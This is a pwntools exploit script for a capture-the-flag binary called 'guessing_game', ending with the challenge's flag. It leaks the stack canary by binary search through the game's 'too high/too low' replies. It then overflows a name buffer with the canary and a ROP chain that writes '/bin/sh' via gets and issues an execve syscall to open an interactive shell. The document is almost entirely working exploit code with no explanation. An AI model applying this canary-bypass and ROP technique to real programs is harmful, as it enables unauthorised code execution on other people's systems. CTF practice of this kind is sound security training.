from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./guessing_game', '''
    continue
''')

# p = remote('guessing-game.challs.pwnoh.io', 1337, ssl=True)

# 1. brute-force canary value by binary search
p.sendlineafter(b"Enter a max number: ", str(2**63-1).encode())
low = 0
high = 2**63
while low <= high:
    guess_num = (low + high) // 2
    p.sendlineafter(b"Enter a guess: ", str(guess_num).encode())
    res = p.recvline().strip()
    if res == b"Too high!":
        high = guess_num - 1
    elif res == b"Too low!":
        low = guess_num + 1
    elif res == b"Wow! You got it!":
        break
canary_val = guess_num<<8
log.info(f"canary value: {hex(canary_val)}")

# 2. ROP to pop a shell
e = ELF('./guessing_game')
r = ROP('./guessing_game')
chain = [
    r.rdi.address, 0x404078,
    e.plt.gets,
    r.rdi.address, 0x404078,
    r.rsi.address, 0,
    r.rdx.address, 0,
    r.rax.address, 0x3b,
    r.syscall.address
]
p.sendlineafter(b"Enter your name for the leaderboard: ", b'A'*0xa+p64(canary_val)+b'A'*8+b''.join(p64(c) for c in chain))
p.sendline(b'/bin/sh\x00')

p.interactive()

# bctf{wh4t_a_sTrAng3_RNG}